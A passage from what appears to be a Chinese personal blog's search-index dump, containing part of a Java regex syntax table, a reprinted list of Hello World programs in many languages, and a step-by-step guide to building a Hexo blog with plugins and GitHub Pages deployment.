bracket} $ (dollar sign) ( (left parenthesis) ) (right parenthesis) ? (pipe) sterisk) lus symbol) ? (question mark) { (left curly bracket, or left brace) \\ backslash view plaincopy to clipboardprint? 构造 匹配于 构造 匹配于 view plaincopy to clipboardprint? 字符 x 字符 x \\\\ 反斜线字符 \\0n 八进制值的字符0n (0 &lt;= n &lt;= 7) \\0nn 八进制值的字符 0nn (0 &lt;= n &lt;= 7) \\0mnn 八进制值的字符0mnn 0mnn (0 &lt;= m &lt;= 3, 0 &lt;= n &lt;= 7) \\xhh 十六进制值的字符0xhh \\uhhhh 十六进制值的字符0xhhhh \\t 制表符('\\u0009') \\n 换行符 ('\\u000A') \\r 回车符 ('\\u000D') \\f 换页符 ('\\u000C') \\a 响铃符 ('\\u0007') \\e 转义符 ('\\u001B') \\cx T对应于x的控制字符 x 字符 x 字符 x \\\\ 反斜线字符 \\0n 八进制值的字符0n (0 &lt;= n &lt;= 7) \\0nn 八进制值的字符 0nn (0 &lt;= n &lt;= 7) \\0mnn 八进制值的字符0mnn 0mnn (0 &lt;= m &lt;= 3, 0 &lt;= n &lt;= 7) \\xhh 十六进制值的字符0xhh \\uhhhh 十六进制值的字符0xhhhh \\t 制表符('\\u0009') \\n 换行符 ('\\u000A') \\r 回车符 ('\\u000D') \\f 换页符 ('\\u000C') \\a 响铃符 ('\\u0007') \\e 转义符 ('\\u001B') \\cx T对应于x的控制字符 x view plaincopy to clipboardprint? 字符类 [abc] a, b, or c (简单类) [^abc] 除了a、b或c之外的任意 字符（求反） [a-zA-Z] a到z或A到Z ，包含（范围) [a-z-[bc]] a到z，除了b和c ： [ad-z]（减去） [a-z-[m-p]] a到z，除了m到 p： [a-lq-z] [a-z-[^def]] d, e, 或 f 字符类 [abc] a, b, or c (简单类) [^abc] 除了a、b或c之外的任意 字符（求反） [a-zA-Z] a到z或A到Z ，包含（范围) [a-z-[bc]] a到z，除了b和c ： [ad-z]（减去） [a-z-[m-p]] a到z，除了m到 p： [a-lq-z] [a-z-[^def]] d, e, 或 f view plaincopy to clipboardprint? 预定义的字符类 . 任意字符（也许能与行终止符匹配，也许不能） \\d 数字: [0-9] \\D 非数字: [^0-9] \\s 空格符: [ \\t\\n\\x0B\\f\\r] \\S 非空格符: [^\\s] \\w 单词字符: [a-zA-Z_0-9] \\W 非单词字符: [^\\w]","tags":"reprint 正则表达式"},{"title":"多语言实现hello world","url":"/20191127/duo-yu-yan-shi-xian-hello-world/","text":"作为所有编程语言的起始阶段，HELLO WORLD占据着无法改变的地位，所有中/英/法/德/美……版本的编程教材中，HELLO WORLD总是作为第一个TEST记录于书本之中，所有的编程第一步就在于此了！经典之中的经典！HELLO WORLD！ 这个例程是从Kernighan &amp; Ritchie 合著的《The C Programme Language》开始有的，因为它的简洁，实用，并包含了一个程序所应具有的一切，因此为后来的些类书的作者提供了范例，一直待续到今。 我们刚开始接触计算机语言大多从Hello world 开始，下面是各种语言的Hello world program： AKA 控制台: ABC语言的Hello World程序 12 WHILE (1=1) : WRITE &quot;Hello World &quot; Ada语言的Hello World程序 12345with Ada.Text_Io; use Ada.Text_Io;procedure Hello isbeginPut_Line (&quot;Hello, world!&quot;);end Hello; AmigaE语言的Hello World程序 123 PROC main() WriteF(&#x27;Hello, World!&#x27;) ENDPROC APL语言的Hello World程序 1 &#x27;Hello World&#x27; Assembly语言的Hello World程序 1234567891011121314151617 Accumulator-only architecture: DEC PDP-8, PAL-III assembler See the Example section of the PDP-8 article. Accumulator + index register machine: MOS 6502, CBM, ca65 asm MSG: .ASCIIZ &quot;Hello, world!&quot; LDX #0 LDA MSG,X ; load initial char @LP: JSR $FFD2 ; CHROUT CBM KERNAL INX LDA MSG,X BNE @LP RTS Accumulator/Index microcoded machine: Data General Nova, RDOS See the example section of the Nova article. Expanded accumulator machine: Intel x86, MS-DOS, TASM MODEL SMALL IDEAL STACK 100H DATASEG语言的Hello World程序 1 MSG DB &#x27;Hello, world!$&#x27; CODESEG语言的Hello World程序 12345678910111213141516171819202122232425262728293031323334353637383940 MOV AX, @data MOV DS, AX MOV DX, OFFSET MSG MOV AH, 09H ; DOS: output ASCII$ string INT 21H MOV AX, 4C00H INT 21H END General-purpose-register CISC: DEC PDP-11, RT-11, MACRO-11 .MCALL .REGDEF,.TTYOUT,.EXIT .REGDEF HELLO: MOV #MSG,R1 MOVB (R1),R0 LOOP: .TTYOUT MOVB +(R1),R0 BNE LOOP .EXIT MSG: .ASCIZ /HELLO, WORLD!/ .END HELLO CISC: VAX, VMS, MACRO32 .title hello term_name: .ascid /SYS$INPUT/ term_chan: .blkw 1 out_iosb: .blkq 1 msg: .asciz /Hello, world!/ .entry start,0 ; establish a channel for terminal I/O $assign_s devnam=term_name,- chan=term_chan blbc r0,error ; queue the I/O request $qio_s chan=term_chan,- func=#io$_writevblk,- iosb=out_iosb,- p1=msg,- p2=#13 blbc r0,error $exit_s ; normal exit error: halt ; error condition .end start AWK语言的Hello World程序 1 BEGIN &#123; print &quot;Hello, world!&quot; &#125; BASIC语言的Hello World程序: 1 PRINT &quot;HELLO WORLD&quot; MS BASIC语言的Hello World程序 123 (traditional, unstructured) 10 PRINT &quot;Hello, world!&quot; 20 END TI-BASIC语言的Hello World程序 1 isp &quot;Hello, world!&quot; Structured BASIC语言的Hello World程序 1 print &quot;Hello, world!&quot; BCPL语言的Hello World程序 12345 GET &quot;LIBHDR&quot; LET START () BE $( WRITES (&quot;Hello, world!*N&quot;) $) C语言的Hello World程序 12345678910111213141516 #include &lt;stdio.h&gt; int main(void) &#123; printf(&quot;Hello, world!\\n&quot;); &#125;``` C++语言的Hello World程序```c++ #include &lt;iostream&gt; using namespace std; int main() &#123; cout &lt;&lt; &quot;Hello, world!&quot; &lt;&lt; endl; return 0; &#125; C#语言的Hello World程序 12345 class HelloWorldApp &#123; public static void Main() &#123; System.Console.WriteLine(&quot;Hello, world!&quot;); &#125; &#125; Clean语言的Hello World程序 123 module hello Start :: String Start = &quot;Hello, world&quot; CLIST语言的Hello World程序 12 PROC 0 WRITE Hello, World! COBOL语言的Hello World程序 1234567 IDENTIFICATION DIVISION. PROGRAM-ID. HELLO-WORLD. ENVIRONMENT DIVISION. DATA DIVISION. PROCEDURE DIVISION. DISPLAY &quot;Hello, world!&quot;. STOP RUN. Common Lisp语言的Hello World程序 1 (format t &quot;Hello world!~%&quot;) Eiffel语言的Hello World程序 123456789101112 class HELLO_WORLD creation make feature make is local io:BASIC_IO do !!io io.put_string(&quot;%N Hello, world!&quot;) end -- make end -- class HELLO_WORLD Erlang语言的Hello World程序 123 -module(hello). -export([hello_world/0]). hello_world() -&gt; io:fwrite(&quot;Hello, world!\\n&quot;). Forth语言的Hello World程序 1 .&quot; Hello, world!&quot; CR Fortran语言的Hello World程序 12345 PROGRAM HELLO WRITE(*,10) 10 FORMAT(&#x27;Hello, world!&#x27;) STOP END Haskell语言的Hello World程序 12 module HelloWorld (main) where main = putStr &quot;Hello World\\n&quot; Iptscrae语言的Hello World程序 123 ON ENTER &#123; &quot;Hello, &quot; &quot;World!&quot; &amp; SAY &#125; Java语言的Hello World程序 12345 public class Example&#123; public static void main(String[] args) &#123; System.out.println(&quot;Hello, world!&quot;); &#125; &#125; Logo语言的Hello World程序 1 print [hello world!] Lua语言的Hello World程序 1 print &quot;Hello, world!&quot; MIXAL语言的Hello World程序 123456789 TERM EQU 19 the MIX console device number ORIG 1000 start address START OUT MSG(TERM) output data at address MSG HLT halt execution MSG ALF &quot;MIXAL&quot; ALF &quot; HELL&quot; ALF &quot;O WOR&quot; ALF &quot;LD &quot; END START end of the program MSDOS batch语言的Hello World程序 12 @echo off echo Hello, world! OCaml语言的Hello World程序 1234567891011 let _ = print_endline &quot;Hello world!&quot;;; OPL PROC hello: PRINT &quot;Hello, World&quot; ENDP Pascal program Hello; begin writeln(&#x27;Hello, world!&#x27;); end. Pascal语言的Hello World程序 1234 program hello_world; begin writeln(&#x27;Hello World!&#x27;); end. Perl语言的Hello World程序 1 print &quot;Hello, world!\\n&quot;; PHP语言的Hello World程序 123 &lt;?php print(&quot;Hello, world!&quot;); ?&gt; Pike语言的Hello World程序 12345 #!/usr/local/bin/pike int main() &#123; write(&quot;Hello, world!\\n&quot;); return 0; &#125; PL/I语言的Hello World程序 1234 Test: procedure options(main); declare My_String char(20) varying initialize(&#x27;Hello, world!&#x27;); put skip list(My_String); end Test; Python语言的Hello World程序 1 print &quot;Hello, world!&quot; REXX语言的Hello World程序 12 also NetRexx and Object REXX say &quot;Hello, world!&quot; Ruby语言的Hello World程序 1 print &quot;Hello, world!\\n&quot; Sather语言的Hello World程序 12345 class HELLO_WORLD is main is #OUT+&quot;Hello World\\n&quot;; end; end; Scheme语言的Hello World程序 12 (display &quot;Hello, world!&quot;) (newline) sed语言的Hello World程序 12 (requires at least one line of input) sed -ne &#x27;1s/.*/Hello, world!/p&#x27; Self语言的Hello World程序 1 &#x27;Hello, World!&#x27; uppercase print. Smalltalk语言的Hello World程序 1 Transcript show: &#x27;Hello, world!&#x27; SML语言的Hello World程序 1 print &quot;Hello, world!\\n&quot;; SNOBOL语言的Hello World程序 12 OUTPUT = &quot;Hello, world!&quot; END SQL语言的Hello World程序 12345678910 create table MESSAGE (TEXT char(15)); insert into MESSAGE (TEXT) values (&#x27;Hello, world!&#x27;); select TEXT from MESSAGE; drop table MESSAGE; Or, more simply print &#x27;Hello, World.&#x27; StarOffice Basic sub main print &quot;Hello, World&quot; end sub Tcl语言的Hello World程序 1 puts &quot;Hello, world!&quot; Turing语言的Hello World程序 1 put &quot;Hello, world!&quot; UNIX-style shell语言的Hello World程序 1 echo &#x27;Hello, world!&#x27; Romanian pseudocode语言的Hello World程序 1234 (UBB Cluj-Napoca)Algoritmul Salut este: fie s:=&quot;Hello, world&quot;; tipareste s; sf-Salut 传统图形界面应用开发工具: 1234567891011121314151617181920212223242526272829303132 C++ bindings for GTK graphics toolkit #include #include #include #include using namespace std; class HelloWorld : public Gtk::Window &#123; public: HelloWorld(); virtual ~HelloWorld(); protected: Gtk::Button m_button; virtual void on_button_clicked(); &#125;; HelloWorld::HelloWorld() : m_button(&quot;Hello, world!&quot;) &#123; set_border_width(10); m_button.signal_clicked().connect(SigC:lot(*this, &amp;HelloWorld::on_button_clicked)); add(m_button); m_button.show(); &#125; HelloWorld::~HelloWorld() &#123;&#125; void HelloWorld::on_button_clicked() &#123; cout &lt;&lt; &quot;Hello, world!&quot; &lt;&lt; endl; &#125; int main (int argc, char *argv[]) &#123; Gtk::Main kit(argc, argv); HelloWorld helloworld; Gtk::Main::run(helloworld); return 0; &#125; Java语言的Hello World程序 1234567891011121314151617181920212223242526272829303132333435 import java.awt.*; import java.awt.event.*; public class HelloFrame extends Frame &#123; HelloFrame(String title) &#123; super(title); &#125; public void paint(Graphics g) &#123; super.paint; java.awt.Insets ins = this.getInsets(); g.drawString(&quot;Hello, world!&quot;, ins.left + 25, ins.top + 25); &#125; public static void main(String args []) &#123; HelloFrame fr = new HelloFrame(&quot;Hello&quot;); fr.addWindowListener( new WindowAdapter() &#123; public void windowClosing(WindowEvent e) &#123; System.exit( 0 ); &#125; &#125; ); fr.setResizable(true); fr.setSize(500, 100); fr.setVisible(true); &#125; &#125; Qt toolkit (in C++) #include #include #include #include class HelloWorld : public QWidget &#123; &#125; public语言的Hello World程序 12345678910111213141516171819 HelloWorld(); virtual ~HelloWorld(); public slots: void handleButtonClicked(); QPushButton *mPushButton; &#125;; HelloWorld::HelloWorld() : QWidget(), mPushButton(new QPushButton(&quot;Hello, World!&quot;, this)) &#123; connect(mPushButton, SIGNAL(clicked()), this, SLOT(handleButtonClicked())); &#125; HelloWorld::~HelloWorld() &#123;&#125; void HelloWorld::handleButtonClicked() &#123; std::cout &lt;&lt; &quot;Hello, World!&quot; &lt;&lt; std::endl; &#125; int main(int argc, char *argv[]) &#123; QApplication app语言的Hello World程序 123456 (argc, argv); HelloWorld helloWorld; app.setMainWidget(&amp;helloWorld); helloWorld.show(); return app.exec(); &#125; Visual Basic语言的Hello World程序 1.信息框 1 MsgBox &quot;Hello, world!&quot; 2.输出到窗体 1 Print &quot;Hello, world!&quot; Windows API (in C)语言的Hello World程序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 #include LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM); char szClassName[] = &quot;MainWnd&quot;; HINSTANCE hInstance; int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123; HWND hwnd; MSG msg; WNDCLASSEX wincl; hInstance = hInst; wincl.cbSize = sizeof(WNDCLASSEX); wincl.cbClsExtra = 0; wincl.cbWndExtra = 0; wincl.style = 0; wincl.hInstance = hInstance; wincl.lpszClassName = szClassName; wincl.lpszMenuName = NULL; //No menu wincl.lpfnWndProc = WindowProcedure; wincl.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); //Color of the window wincl.hIcon = LoadIcon(NULL, IDI_APPLICATION); //EXE icon wincl.hIconSm = LoadIcon(NULL, IDI_APPLICATION); //Small program icon wincl.hCursor = LoadCursor(NULL, IDC_ARROW); //Cursor if (!RegisterClassEx(&amp;wincl)) return 0; hwnd = CreateWindowEx(0, //No extended window styles szClassName, //Class name &quot;&quot;, //Window caption WS_OVERLAPPEDWINDOW &amp; ~WS_MAXIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT, //Let Windows decide the left and top positions of the window 120, 50, //Width and height of the window, NULL, NULL, hInstance, NULL); //Make the window visible on the screen ShowWindow(hwnd, nCmdShow); //Run the message loop while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; return msg.wParam; &#125; LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) &#123; PAINTSTRUCT ps; HDC hdc; switch (message) &#123; case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); TextOut(hdc, 15, 3, &quot;Hello, world!&quot;, 13); EndPaint(hwnd, &amp;ps); break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hwnd, message, wParam, lParam); &#125; return 0; &#125; 基于web图形用户界面: Java applet语言的Hello World程序 123456789 Java applets work in conjunction with HTML files. HelloWorld Program says: import java.applet.*; import java.awt.*; public class HelloWorld extends Applet &#123; public void paint(Graphics g) &#123; g.drawString(&quot;Hello, world!&quot;, 100, 50); &#125; &#125; JavaScript, aka ECMAScript语言的Hello World程序 123456 JavaScript is a scripting language used in HTML files. To demo this program Cut and Paste the following code into any HTML file. onclick=&quot;javascript:helloWorld();&quot;&gt;Hello World Example An easier method uses JavaScript implicitly, calling the reserved alert function. Cut and paste the following line inside the .... HTML tags. Hello World Example An even easier method involves using popular browsers&#x27; support for the virtual &#x27;javascript&#x27; protocol to execute JavaScript code. Enter the following as an Internet address (usually by pasting into the address box): javascript:alert(&#x27;Hello, world!&#x27;) 文档格式: ASCII语言的Hello World程序 12 The following sequence of characters, expressed in hexadecimal notation (with carriage return and newline characters at end of sequence): 48 65 6C 6C 6F 2C 20 77 6F 72 6C 64 21 0D 0A HTML语言的Hello World程序 12345 &lt;HTML&gt; &lt;body&gt; &lt;p&gt;Hello, world!&lt;/p&gt; &lt;/body&gt; &lt;/HTML&gt; PostScript语言的Hello World程序 12345 /font /Courier findfont 24 scalefont font setfont 100 100 moveto (Hello world!) show showpage TeX语言的Hello World程序 123 \\font\\HW=cmr10 scaled 3000 \\leftline&#123;\\HW Hello world&#125; \\bye LaTeX语言的Hello World程序 1234 \\documentclass｛article｝ \\begin｛document｝ Hello, world! \\end｛document｝ 批处理语言的Hello World程序 1 echo Hello World！ 易语言的Hello World程序 12 .子程序 __启动窗口_创建完毕 信息框 (“Hello, world!”, 0, )","tags":"c/c++ matlab"},{"title":"Hexo建站过程总结","url":"/20191122/hexo-jian-zhan-guo-cheng-zong-jie/","text":"Hexo建站过程总结 Hexo 是一个基于 Node.js 快速、简洁且高效的博客框架，可以将 Markdown 文件快速的生成静态网页，托管在 GitHub Pages 上。 Hexo和WordPress有很大的不同，个人觉得Hexo更加方便快捷，没有WorldPress那么臃肿和繁琐，不需要主机空间，不需要数据库。所有的数据都是保存成html静态的页面。而且可以放在GitHub上面挂载，自己只需要购买一个域名就可以了，甚至连域名都不需要购买，用GitHub自己提供的域名也是不错的——XXX.github.io。 安装 git 无需赘言。安装完成后在命令行窗口输入：git --version，出现版本号则说明安装成功。 安装 Node.js 安装完之后，打开 Git Bash，输入：npm -v 同样的，出现版本号则说明安装成功。 安装 Hexo 框架 在 Git Bash 中输入： npm install -g hexo-cli 如无法安装可使用替代命令：cnpm install -g hexo-cli 创建 Hexo 项目 ※创建本地项目文件夹 假设创建一个名为 hexo 的项目，项目目录就放在：E:\\ 目录下，所以我们在 E:\\ 目录下创建一个 hexo 目录。现在这个项目的全路径是：E:\\hexo 123456打开 Git Bash进入该目录： cd E:\\hexo然后执行 hexo init最后执行 npm install安装完成后 E:\\hexo 中应该有这几个文件 node_modules scaffolds source themes_config.yml package.json启动服务 hexo server 在浏览器中访问： http://localhost:4000/ 即可看到 Hexo 页面。 ※修改deploy 这里需要在 GitHub 上面申请一个Git Pages。 接下来打开根目录 hexo_config.yml，找到最下面的deploy。这是我的deploy，你只需把我的用户名改为你的即可： 1234deploy: type: git repo: git@github.com:yaoqs/yaoqs.github.io.git branch: master ※更换主题 Hexo自带的主题真的感觉很一般，在 Hexo 社区中有很多优秀的主题可以选择,知乎中有很多的推荐。 NexT 的主题，这个主题提供的文档很全面，对新人很友好。下面以这个主题为例，优化博客。也可以使用自定义主题。 ※安装主题 让 Git Bash 保持在 E:\\hexo 目录下，然后输入命令：git clone https://github.com/iissnan/hexo-theme-next themes/next ※启用主题 打开根目录下的 _config.yml (这个文件主要是用于站点全局的配置)，找到 theme 字段，并且将值改成 next。注意，theme： 和next之间是有一个空格的。即 theme: next ※验证主题 验证之前， 我们使用 hexo clean 来清除 Hexo 的缓存。 首先启动 Hexo 本地站点，并开启调试模式（即加上 --debug），整个命令是 hexo s --debug。 当命令行提示出：INFO Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop. 此时就可以使用浏览器访问 http://localhost:4000，检查站点是否正确运行。 ※主题设定 选择Scheme 设置语言 设置菜单 设置头像… 具体的设置参考http://theme-next.iissnan.com/ NexT的介绍页面。 ※上传本地项目 首先要生成自己git本地的私钥和公钥，并将公钥放到自己的 GitHub 上面。 要把本地的静态博客同步到 Github，我们还需要先安装两个跟部署相关的 hexo 插件：继续在 Git Bash 中输入： 12cnpm install hexo -server --savecnpm install hexo-deployer-git --save 123456打开 Git Bashcd E:\\hexohexo clean //清除项目缓存hexo g // hexo generate的缩写hexo s // hexo server的缩写hexo d // hexo deploy的缩写 更多的命令可以参考 Hexo 的官方文档 https://hexo.io/zh-cn/docs/ ※域名绑定 首先我们要一个 CNAME 文件，把该文件放在 E:\\hexo\\source 目录下，以后一些需要放在根目录的资源文件都可以放这里。在GitHub页面也可以建立这个文件。然后在文件里输入你要绑定的域名，比如说 romition.com。 接着我们要到DNSPOD或者万网上面设置域名解析。 设置 CNAME 为自己github上面的地址 比如 XXXXXX.github.io. 注意这里最后面有个点设置 A 为 103.245.222.133 ※404、关于、标签 在新的站点搭建好后，404、关于、标签 这三项内容一般需要自定义设置。在项目根目录下 (E:\\hexo) 下启动 Git Bash 。 新增一个 404 页面：hexo new page 404 新增一个 关于 页面：hexo new page about 新增一个 标签 页面：hexo new page tags ※插件 和 WordPress 一样，Hexo 也是有很多插件可以使用的。 插件官网：https://hexo.io/plugins/ 安装插件：npm install 插件名 --save 卸载插件：npm uninstall 插件名 更新插件和博客框架（需要在根目录下）：npm update ※几个常用的插件： 支持RSS：npm install hexo-generator-feed --save Markdown 解析和渲染的插件 hexo-renderer-marked： Hexo默认的Markdown的渲染器，GitHub地址：hexojs/hexo-renderer-marked，安装方式：npm install hexo-renderer-marked —save hexo-renderer-kramed：基于hexo-renderer-marked二次开发的渲染器，完善了对Mathjax的支持，仍然不支持插件的扩展，不支持emoji表情。GitHub地址：sun11/hexo-renderer-kramed，安装方式：npm install hexo-renderer-kramed --save hexo-renderer-pandoc：与hexo-renderer-marked类似，GitHub地址：wzpan/hexo-renderer-pandoc，安装方式：npm install hexo-renderer-pandoc --save。 hexo-renderer-markdown-it：https://www.jianshu.com/p/588ab3d22eb8 支持Mathjax语法（支持不太好），支持Markdown以及CommonMark语法，渲染速度比hexo-renderer-marked快，支持插件配置，支持标题带安全的id信息，支持脚注（上标，下标，下划线）。 GitHub地址：hexojs/hexo-renderer-markdown-it，安装方式：npm i hexo-renderer-markdown-it —save hexo-renderer-markdown-it-plus：支持Katex插件并默认启用，默认启用插件列表：markdown-it-emoji，markdown-it-sub，markdown-it-sup，markdown-it-deflist，markdown-it-abbr，markdown-it-footnote，markdown-it-ins，markdown-it-mark，@iktakahiro/markdown-it-katex，markdown-it-toc-and-anchor。 GitHub地址：CHENXCHEN/hexo-renderer-markdown-it-plus，安装方式：npm i hexo-renderer-markdown-it-plus —save 生成站点地图：npm install hexo-generator-sitemap --save 生成百度站点地图：npm install hexo-generator-baidu-sitemap --save HTML 压缩：npm install hexo-html-minifier --save 搜索 npm install hexo-generator-search --save 在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项： 123search: path: search.xml field: post 文章字数统计插件 npm i --save hexo-wordcount 代码高亮 npm i -S hexo-prism-plugin --save 修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置 hexo-generator-json-feed 生成 json 格式的文件而不是 xml 用以保存 feed 数据 短链生成 npm install hexo-abbrlink --save 自动生成短链例如 abbrlink: 18338（据说此种格式有利于SEO优化）。如有必要可直接修改Front-matter（文章信息头）进行自定义 abbrlink: 我的文章-my-posts-12138，尽量使用字母和数字，空格用 - 替代，提升链接可读性。 文章置顶先 npm uninstall hexo-generator-index --save 再 npm install hexo-generator-index-pin-top --save 在 Front-matter 插入 top:100，数字越大文章在首页的位置越靠前。 文章加密 npm install --save hexo-blog-encrypt 在文章信息头插入 password: mikemessi abstract: 有东西被加密了, 请输入密码查看. message: 您好, 这里需要密码. 解密后部分元素可能无法正常显示或者表现，见详细配置 文章隐藏 npm install hexo-hide-posts --save 默认 hidden: true 用于隐藏，hidden 可自定义为自己喜欢的名字。 生成feed订阅（RSS） npm install hexo-generator-feed --save 默认只获取文章摘要或者前140个字符 站点地图 sitemap 自动生成 sitemap.xml ，可提交给搜索引擎（百度拉胯，谷歌和雅虎收录极快，Bing也还行）。搜索 site:loafing.cn 查看被收录情况。 不跟踪外链 npm i hexo-filter-nofollow --save 对SEO友好。 可排除自定义域名。 自动提交链接至搜索引擎 npm install --save hexo-submit-urls-to-search-engine 提交效果不错，但百度放出页面的速度依旧感人，谷歌、必应、雅虎的收录速度很快。 首选网页 canonical npm install --save hexo-auto-canonical SEO 友好，为重复网址或重复网页/类似网页指定规范网址。加进主题的 \\themes\\cards\\layout_partial\\head\\index.ejs 1&lt;%- autoCanonical(config, page) %&gt; 比如我这里无论是 http://127.0.0.1:4000/tags/ 、https://coding.loafing.cn/tags/ 还是 https://blog.loafing.cn/tags/ 都自动在网页源码的 &lt; /head&gt; 标签之前加入&lt; link rel=“canonical” href=&quot;https://loafing.cn/tags/ &quot; &gt;有利于将搜索结果全部引导至首选域名。参考：整合重复网址 - Google Search Console 可视化编辑 npm install --save hexo-admin hexo搭建静态博客(五)——其他一些DIY 音乐播放 aplayer npm install --save hexo-tag-aplayer 在指定位置生成一个播放器，播放器将支持对于 QQ 音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。 官方文档：https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md 建议新建一个歌单专门用于网站播放，歌曲越多加载越慢。 1&#123;% meting &quot;7635339557&quot; &quot;tencent&quot; &quot;playlist&quot; &quot;order:random&quot; &quot;preload:none&quot;%&#125; 视频播放 dplayer npm install hexo-tag-dplayer --save 比video标签好用。功能强大，支持字幕引入。 1&#123;% dplayer &quot;url=https://lyfclub.herokuapp.com/videos/%E5%88%98%E4%BA%A6%E8%8F%B2.mp4&quot; &quot;pic=https://wxt.sinaimg.cn/thumb300/006UN1LVgy1gfauot0mgvj30go0byt97.jpg?tags=%5B%5D&quot; &quot;loop=yes&quot; &quot;theme=#FADFA3&quot; &quot;autoplay=false&quot; %&#125; 豆瓣电影/读书/音乐卡片 npm install hexo-douban-card --save 123&#123;% douban movie 24745500 %&#125;&#123;% douban book 30376420 %&#125;&#123;% douban music 35099703 %&#125; pdf npm install --save hexo-pdf 123&#123;% pdf http://7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125;&#123;% pdf ./bash_freshman.pdf %&#125;&#123;% pdf https://drive.google.com/file/d/0B6qSwdwPxPRdTEliX0dhQ2JfUEU/preview %&#125; 代码压缩 npm install hexo-neat --save 只压缩html就够了吧，去除多余空格和换行。 1234neat_enable: trueneat_html: enable: true exclude: 实测：用手机总共生成153个文件，hexo g 的时间从压缩前的 4.43 秒增至 9.95 秒，生成的文件大小从 4.02 MB 缩至 3.62 MB。耗费少许生成静态文件的时间，提高页面渲染速度，值得😌 不知道怎样排除 /tags/标签/ 和按日期归档这类没多大必要压缩的页面 html 文件，浪费时间🤔 文字上方注释 Ruby 相关介绍见：https://wikipedia.org/wiki/Ruby_character 之前用的 Ruby Character 过于古早，手机安装成功但电脑上使用有问题，弃疗。加上我已经卸载 hexo 默认的 markdown 渲染器，改用 hexo-renderer-markdown-it（具体使用方法这里不阐述，太长），正好可以试试 markdown-it-ruby npm install markdown-it-ruby --save 站点根目录配置引入插件 1234markdown: # xxxxxx其它配置项 plugins: - markdown-it-ruby 用法： 123&#123;特朗普|川建国&#125; → 特朗普&#123;特朗普|chuān jiàn guó&#125; → 特朗普&#123;超電磁砲|レールガン&#125; → 超電磁砲 如果自己的输入法输入带声调符号的拼音有困难，还可以使用 hexo-pinyin-ruby-marks。 npm install hexo-pinyin-ruby-marks 1&#123;% pinyin 初音未来|chu1 yin1 wei4 lai2 %&#125; → 初音未来 文字遮盖效果 Spoiler npm install hexo-spoiler --save 预览效果站点根目录配置填写 1234spoiler: style: blur # 或者box color: black # 仅当 style 为 box 时起效 p: false # 没懂啥意思，不管它 123456&#123;% spoiler option:value text... %&#125;&#123;% spoiler 默认配置效果 %&#125; → 默认配置效果&#123;% spoiler style:blur 糊里糊涂 %&#125; → 糊里糊涂&#123;% spoiler style:box 黑不溜秋 %&#125; → 黑不溜秋&#123;% spoiler style:box color:red 红光闪闪 %&#125; → 红光闪闪 可见 box 颜色遮盖条的高度跟文字尺寸不匹配，显得尴尬，还是用blur吧😌 分栏 npm install hexo-tag-common 具体使用说明：Tabs-NexT 有效节省空间 预览 数据可视化工具 Chartjs Chart.js 介绍 插件预览效果 npm install hexo-tag-chart --save 简单展示一下折线图 支持混合重叠，轻便简洁，效果很漂亮，但静态页面改起来好像不太方便😌 盘古之白 npm install hexo-pangu 送给所有中英混输必须加空格的强迫症患者。 死链检查 npm install hexo-broken-links-checker --save-dev npx hexo check-links WARN The following links are broken: https:// 默认配置就够了，偶尔用一次。 Instagram分享 npm install hexo-tag-instagram --save 1&#123;% instagram false https://www.instagram.com/p/B2vyQrxHuIN/ 100% %&#125; 二维码 qrcode npm i hexo-tag-qrcode 123&#123;% qrcode &quot;自定义内容&quot; %&#125; 👉# 完整写法&#123;% qrcode &quot;hello, world&quot; alt:&quot;hello, world&quot; title:&quot;hello, world&quot; hello world %&#125; 悬浮注释 hint npm install hexo-tag-hint --save 123&#123;% hint &#x27;这里是正文&#x27; &#x27;这里是注释 :D&#x27; %&#125;&lt;br&gt; # 换行判定好像有问题，必须手动加 br 标签&#123;% hint &#x27;I\\&#x27;m Groot&#x27; &#x27;I\\&#x27;m Groot&#x27; %&#125; 这里是正文I’m Groot 碰到单引号 ’ 需要反斜杠 \\ 转义 动态终端代码演示 npm install @heowc/hexo-tag-gdemo 介绍及效果预览 123456789101112131415161718192021&#123;% gdemo_terminal command [最小高度] [窗口标题] [延迟时间] [提示字符] [唯一id] [高亮语言] %&#125;content&#123;% endgdemo_terminal %&#125;&#123;% gdemo_terminal &#x27;node ./demo&#x27; &#x27;250px&#x27; &#x27;bash&#x27; &#x27;500&#x27; &#x27;$&#x27; &#x27;demo-teriminal&#x27; %&#125;Hello World!&#123;% endgdemo_terminal %&#125;用 ; 隔开代码&#123;% gdemo_terminal &#x27;cd /usr/bin;./node ./demo&#x27; &#x27;250px&#x27; &#x27;bash&#x27; &#x27;500&#x27; &#x27;$&#x27; &#x27;demo-teriminal&#x27; %&#125;Hello World!&#123;% endgdemo_terminal %&#125;&#123;% gdemo_editor &#x27;250px&#x27; &#x27;bash&#x27; &#x27;500&#x27; &#x27;demo-editor&#x27; %&#125;function greet()&#123;console.log(&quot;Hello World!&quot;);&#125;greet();&#123;% endgdemo_editor %&#125; 「推荐」本站用到的 hexo 插件 其他 搜索引擎通过一种程序 robot（又称spider），自动访问互联网上的网页并获取网页信息。我们可以在博客中创建一个纯文本文件 robots.txt，在这个文件中声明该网站中不想被 robot 访问的部分，这样，博客的部分内容就可以不被搜索引擎收录了，或者指定搜索引擎只收录指定的内容。 在根目录（E:\\hexo\\source） 目录下，新增一个 robot.txt 文件。 robot.txt 文件内容： 12345678User-Agent: *Allow: /Disallow: /backgroundDisallow: /cssDisallow: /imgDisallow: /jsSitemap: http://romition.com/sitemap.xmlSitemap: http://romition.com/baidusitemap.xml 结束语 在搭建过程中可能会遇到各种各样的问题，那么 Google 会是最好的老师。这次写的很简单，在以后我我会逐步完善。","tags":"hexo 